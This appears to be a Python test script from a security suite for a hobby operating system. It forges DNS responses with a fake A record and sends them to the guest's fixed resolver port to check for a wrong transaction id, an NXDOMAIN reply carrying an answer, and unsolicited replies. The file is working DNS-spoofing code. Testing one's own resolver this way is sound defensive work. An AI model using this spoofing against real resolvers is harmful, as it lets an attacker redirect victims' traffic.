#!/usr/bin/env python3
"""
fuzz_dns.py — ATTACK-NET-035, 036, 039, 041

Bat_OS uses fixed txid=0x4242 (resolve_plain) or 0x4243 (resolve_doh),
fixed source port 12345, and fixed DNS server 10.0.2.3.

These attacks send UDP responses to 10.0.2.15:12345 from 10.0.2.3:53
with a chosen IP and chosen malformations. Works through QEMU user-mode
if you can bind 10.0.2.3:53 on the host (requires tap bridge in
practice).

ATTACK-035: wrong txid — accepted anyway.
ATTACK-036: legitimate-looking but sent from 10.0.2.99 with dst port
            still 12345 — still accepted because we don't check source.
ATTACK-039: NXDOMAIN (rcode=3) but with an A record attached.
ATTACK-041: unsolicited response, no query was made.
"""

import sys
import struct
import socket
import time


VICTIM_IP = "10.0.2.15"
VICTIM_PORT = 12345
FAKE_ANSWER = (1, 2, 3, 4)  # evil A record


def dns_response(txid=0x4242, rcode=0, ip=FAKE_ANSWER, qname=b"victim.example"):
    # Flags: QR=1, Opcode=0, AA=0, TC=0, RD=1, RA=1, Z=0, RCODE
    flags = 0x8180 | (rcode & 0xF)
    header = struct.pack("!HHHHHH", txid, flags, 1, 1, 0, 0)

    # Question: qname as length-prefixed labels, QTYPE=A(1), QCLASS=IN(1)
    q = b""
    for part in qname.split(b"."):
        q += bytes([len(part)]) + part
    q += b"\x00" + struct.pack("!HH", 1, 1)

    # Answer: name pointer back to offset 12 (start of question)
    a = b"\xC0\x0C"
    a += struct.pack("!HHIH", 1, 1, 300, 4)  # type A, class IN, TTL 300, rdlen 4
    a += bytes(ip)

    return header + q + a


def send_udp(src_port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("", src_port))  # need CAP_NET_BIND_SERVICE if src_port < 1024
    s.sendto(payload, (VICTIM_IP, VICTIM_PORT))
    s.close()


def attack_035_wrong_txid():
    p = dns_response(txid=0x1234)
    send_udp(53, p)
    print("[ATTACK-NET-035] SENT DNS response with wrong TXID")


def attack_036_wrong_source_port():
    # We have to fake being 10.0.2.3:53. Without raw sockets we can't set
    # src IP. This is a tap-bridge-only attack.
    print("[ATTACK-NET-036] requires raw-socket IP spoof (tap bridge)")


def attack_039_nxdomain_with_answer():
    p = dns_response(txid=0x4242, rcode=3)
    send_udp(53, p)
    print("[ATTACK-NET-039] SENT NXDOMAIN with A record — should be ignored, will be accepted")


def attack_041_unsolicited():
    p = dns_response(txid=0x9999)
    send_udp(53, p)
    print("[ATTACK-NET-041] SENT unsolicited DNS response — should be dropped")


if __name__ == "__main__":
    attack_035_wrong_txid()
    time.sleep(0.2)
    attack_036_wrong_source_port()
    time.sleep(0.2)
    attack_039_nxdomain_with_answer()
    time.sleep(0.2)
    attack_041_unsolicited()
